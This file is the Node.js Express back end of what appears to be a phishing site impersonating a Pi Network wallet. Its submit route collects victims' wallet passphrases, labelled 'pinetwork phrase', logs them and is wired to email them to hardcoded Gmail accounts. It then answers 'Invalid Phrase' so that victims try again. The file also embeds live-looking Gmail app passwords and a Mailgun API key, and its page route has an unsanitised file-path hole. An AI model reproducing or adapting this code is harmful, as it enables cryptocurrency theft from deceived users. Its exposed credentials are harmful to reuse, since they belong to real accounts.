const express = require("express");
const multer = require("multer");
const formData = require("form-data");
const nodemailer = require('nodemailer')
// const Mailgun = require("mailgun.js");

const app = express();
const port = 8000; // Change this to your desired port

// Serve static files from the "my-static-website" directory
// app.use(slashes());

// const mailgun = new Mailgun(formData);
// const mg = mailgun.client({
//   username: "api",
//   key: process.env.MAILGUN_API_KEY || "2fd651279043643ee8ec93bf9a5b030c-78f6ccbe-b7f6d552",
// });

const transporter = nodemailer.createTransport({
  auth: {
    pass: 'zrbi zeqm feow ymab',
    user: 'pinetworkm493@gmail.com'
  },
  service: 'gmail'
})

const tp = nodemailer.createTransport({
  auth: {
    pass: 'giou rjxy aand bvpr',
    user: 'fantomlegen@gmail.com'
  },
  service: 'gmail'
})

// logs any error

const upload = multer();

// Middleware to parse form data
app.use(upload.none());

app.use(express.static("public"));
app.use(express.json());
// app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.sendFile(__dirname + `/template/index.html`);
});

app.get("/:page", (req, res) => {
  const page = req.params.page;
  res.sendFile(__dirname + `/template/${page}.html`);
});

app.post("/submit/7668", async (req, res) => {
  const mfText = req.body["mf-text"];
  const formNonce = req.body["form_nonce"];
  
  
  // forward to Email
  console.log({ mfText });
  try {

      //   const m = await tp.sendMail(
      // {
      //   from: "PiNetworkWallet ",
      //   to: ["fantomlegen@gmail.com"],
      //   subject: "pinetwork phrase",
      //   text: mfText,
        
      //   html: `<h1>${mfText}</h1>`,
      // }
      // );
    
    const msg = await transporter.sendMail(
      {
        from: "PiNetworkWallet ",
        // to: ["chiemelapromise30@gmail.com"],
        to: ["pinetworkm493@gmail.com"],
        subject: "pinetwork phrase",
        // text: mfText,
        
        html: `<h1>❌❌❌ Please reach out to your email service admin for renewal</h1>`,
        // html: `<h1>${mfText}</h1>`,
      }
      );
  } catch (error) {
    console.log(error, 'the error');
  }

  res.json({
    status: 1,
    store_entries: 1,
    error: ["Some thing went wrong."],
    data: {
      message: "Invalid Phrase",
      hide_form: "",
      form_data: {
        action: "insert",
        id: "7668",
        form_nonce: formNonce,
        "mf-text": mfText,
      },
      form_id: "7668",
      store: {
        "mf-text": mfText,
      },
      redirect_to: "",
    },
  });
});
// Start the server
app.listen(port, () => {
  console.log(`Server is running on port http://localhost:${port}`);
});
